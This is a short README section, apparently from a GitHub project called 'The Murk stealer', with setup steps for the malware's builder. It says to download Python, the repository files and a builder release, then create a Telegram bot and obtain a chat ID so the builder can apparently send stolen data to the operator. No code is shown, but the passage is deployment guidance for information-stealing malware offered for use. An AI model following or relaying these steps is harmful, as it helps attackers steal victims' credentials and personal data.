### 🔨Builder

__So firstly you need to download [python](https://www.python.org/downloads/). Secondly you have to download all files from [github](#up).Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer-on-python/releases/tag/The_Murk_v3.5.0) (the builder weighs more than 25 mb, so I can't post it on github) and place in in one folder with previous files. 
Finaly go to the "https://t.me/BotFather" and create your own bot. You need to save token and bot name.
Now you need to get your chat id. To do this, go to the next bot "https://t.me/TgramUserIDBot" and save the id.
Insert this data in builder__
